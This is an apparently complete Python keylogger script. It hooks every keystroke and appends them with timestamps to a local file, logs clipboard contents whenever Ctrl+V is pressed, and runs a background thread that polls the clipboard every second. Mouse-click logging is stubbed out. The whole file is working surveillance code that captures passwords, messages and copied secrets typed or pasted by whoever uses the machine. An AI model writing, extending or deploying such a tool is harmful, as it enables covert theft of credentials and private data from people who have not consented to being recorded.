import keyboard
import pyperclip
from datetime import datetime
import threading
import time
import mouse

last_clipboard = ""

def on_key(event):
    global last_clipboard
    if event.event_type == "down":
        with open("keystrokes.txt", "a", encoding="utf-8") as f:
             
            if event.name == "space":
                f.write(" ")
            elif event.name == "enter":
                timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S] ")
                f.write("\n")
                f.write(timestamp)
                f.write("[enter]")
                f.write("\n") 
            elif event.name == "tab":
                timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S] ")
                f.write("\n")
                f.write(timestamp)
                f.write("[tab]")
                f.write("\n")
            elif event.name == "backspace":
                f.write("<_")
            elif event.name == "right shift":
                f.write("")
            elif event.name == "maiusc":
                f.write("")
            elif event.name == "ctrl" or event.name == "v":
                # Check for paste event (Ctrl+V)
                if keyboard.is_pressed("ctrl") and keyboard.is_pressed("v"):
                    clipboard_content = pyperclip.paste()
                    if clipboard_content != last_clipboard:
                        f.write(f"[PASTE: {clipboard_content}]")
                        last_clipboard = clipboard_content
                elif event.name == "v":
                    f.write("v")
            else:
                f.write(event.name)
            

def clipboard_monitor():
    global last_clipboard
    while True:
        clipboard_content = pyperclip.paste()
        if clipboard_content and clipboard_content != last_clipboard:
            with open("keystrokes.txt", "a", encoding="utf-8") as f:
                timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S] ")
                f.write(f"\n{timestamp}[PASTE (mouse/menu): {clipboard_content}]\n")
            last_clipboard = clipboard_content
        time.sleep(1)  # Check every second

# Start clipboard monitor in a separate thread
threading.Thread(target=clipboard_monitor, daemon=True).start()

def on_mouse_click(event,x):
    '''
    print(event)
    with open("keystrokes.txt", "a", encoding="utf-8") as f:
        timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S] ")
        f.write(f"\n{timestamp}[(mouse-click)]\n")
    '''

# Attach mouse click event
mouse.on_click(on_mouse_click,[1, 2, 3])

keyboard.hook(on_key)
print("Logging Press f12 to stop.")
keyboard.wait("f12")